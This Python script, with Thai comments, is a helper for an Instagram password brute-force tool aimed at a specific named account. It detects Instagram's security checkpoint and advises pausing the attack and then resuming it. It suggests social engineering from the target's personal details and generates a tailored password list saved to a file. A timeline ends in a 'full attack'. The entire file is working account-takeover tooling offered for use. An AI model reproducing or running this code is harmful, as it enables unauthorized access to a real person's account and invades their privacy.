#!/usr/bin/env python3
"""
Instagram Checkpoint Handler
จัดการกรณีที่เจอ checkpoint required
"""

import time
from bruteforce_ig_clean import AdvancedInstagramBruteForcer
import sys
sys.path.append('/workspaces/sugarglitch-realops/scripts')


def analyze_checkpoint_response(response_text):
    """วิเคราะห์ response ที่เจอ checkpoint"""

    checkpoint_indicators = {
        'challenge_required': '🔐 Two-factor authentication required',
        'checkpoint_required': '📱 Phone/Email verification needed',
        'verification_required': '✉️ Email verification required',
        'suspicious_login': '🚨 Suspicious login detected',
        'confirm_email': '📧 Email confirmation needed',
        'phone_verification': '📞 Phone verification required'
    }

    print("🔍 CHECKPOINT ANALYSIS:")
    print("=" * 40)

    found_indicators = []
    for indicator, description in checkpoint_indicators.items():
        if indicator in response_text.lower():
            found_indicators.append((indicator, description))
            print(f"✅ Found: {description}")

    if not found_indicators:
        print("❓ Generic checkpoint detected")

    return found_indicators


def checkpoint_recovery_suggestions(target_username):
    """แนะนำวิธีจัดการ checkpoint"""

    print(f"\n🛠️ CHECKPOINT RECOVERY FOR: {target_username}")
    print("=" * 50)

    print("📋 IMMEDIATE ACTIONS:")
    print("   1. 🛑 STOP brute force attack immediately")
    print("   2. 🌐 Open Instagram in normal browser")
    print("   3. 🔍 Try to visit the profile manually")
    print("   4. 📱 Check if account owner got notification")

    print("\n🔄 RECOVERY METHODS:")
    print("   Method 1 - Browser Recovery:")
    print("   • เปิด https://instagram.com ด้วย browser ปกติ")
    print("   • ลองเข้าสู่ระบบด้วยรหัสผ่านที่น่าจะถูก")
    print("   • ทำตาม checkpoint process")

    print("\n   Method 2 - Account Investigation:")
    print("   • ตรวจสอบ email ที่เชื่อมโยงกับ account")
    print("   • ดูว่ามี SMS verification message ไหม")
    print("   • ลองรีเซ็ต password ผ่าน 'Forgot Password'")

    print("\n   Method 3 - Social Engineering:")
    print("   • หา social media อื่นๆ ของ target")
    print("   • ดูรูปแบบรหัสผ่านจากข้อมูลส่วนตัว")
    print("   • ลองรหัสผ่านที่เกี่ยวข้องกับชื่อ/วันเกิด")


def test_checkpoint_bypass():
    """ทดสอบวิธีการ bypass checkpoint"""

    print("🧪 CHECKPOINT BYPASS TESTING")
    print("=" * 40)

    target_username = "alx.trading"

    # สร้าง session ใหม่ที่สะอาด
    bf = AdvancedInstagramBruteForcer(
        target_username=target_username,
        password_list=["test123"]  # dummy password
    )

    print("1. 🔄 Creating fresh session...")
    session = bf.get_session()

    print("2. 🔍 Testing user existence...")
    exists = bf.validate_user_exists_quick(session)
    print(f"   Result: {exists}")

    print("3. 🎭 Testing with different User-Agent...")
    time.sleep(2)

    session2 = bf.get_session()
    exists2 = bf.validate_user_exists_thorough(session2)
    print(f"   Result: {exists2}")

    print("\n📊 CHECKPOINT STATUS:")
    if exists is None or exists2 is None:
        print("⚠️ Possible checkpoint still active")
        print("🕐 Recommendation: Wait 30-60 minutes")
    elif exists is False and exists2 is False:
        print("❌ Account may not exist or heavily restricted")
    else:
        print("✅ Account accessible, checkpoint may be resolved")


def create_checkpoint_recovery_passwords(target_username):
    """สร้างรายการรหัสผ่านสำหรับ recovery หลัง checkpoint"""

    base_name = target_username.replace('.', '').replace('_', '')

    recovery_passwords = [
        # Basic combinations
        f"{base_name}123",
        f"{base_name}2024",
        f"{base_name}2025",
        f"{base_name}!",
        f"{base_name}@",

        # Trading related
        "trading123",
        "Trading123",
        "AlexTrading",
        "alxtrading",
        "forex123",
        "trader123",

        # Professional patterns
        "Password123",
        "Welcome123",
        "Admin123",
        "Login123",

        # Common patterns
        "123456789",
        "password123",
        "qwerty123",
        "welcome123"
    ]

    print(f"🔑 CHECKPOINT RECOVERY PASSWORDS FOR: {target_username}")
    print("=" * 50)
    print("💡 These passwords should be tried AFTER checkpoint is resolved:")

    for i, pwd in enumerate(recovery_passwords, 1):
        print(f"   {i:2d}. {pwd}")

    # Save to file
    with open('checkpoint_recovery_passwords.txt', 'w') as f:
        for pwd in recovery_passwords:
            f.write(pwd + '\n')

    print(f"\n💾 Passwords saved to: checkpoint_recovery_passwords.txt")

    return recovery_passwords


def main():
    """Main checkpoint analysis function"""

    print("🔒 INSTAGRAM CHECKPOINT HANDLER")
    print("=" * 50)

    target = "alx.trading"

    print("📋 CHECKPOINT DETECTED ANALYSIS:")
    print(f"   🎯 Target: {target}")
    print(f"   🔍 Status: Checkpoint Required")
    print(f"   ✅ Good News: Account exists and is real!")
    print(f"   🔐 Bad News: Instagram is protecting it")

    # วิเคราะห์สถานการณ์
    print(f"\n🧠 WHAT HAPPENED:")
    print(f"   • Instagram detected unusual login attempts")
    print(f"   • Security system triggered")
    print(f"   • Account temporarily protected")
    print(f"   • Verification required to proceed")

    # แนะนำการกู้คืน
    checkpoint_recovery_suggestions(target)

    # สร้างรหัสผ่านสำหรับลองใหม่
    create_checkpoint_recovery_passwords(target)

    # ทดสอบสถานะปัจจุบัน
    print(f"\n🧪 TESTING CURRENT STATUS:")
    test_checkpoint_bypass()

    print(f"\n⏰ RECOMMENDED TIMELINE:")
    print(f"   • Now: Stop all attacks")
    print(f"   • +30 min: Test account accessibility")
    print(f"   • +1 hour: Try recovery passwords")
    print(f"   • +2 hours: Resume careful testing")
    print(f"   • +24 hours: Full attack if needed")


if __name__ == "__main__":
    main()
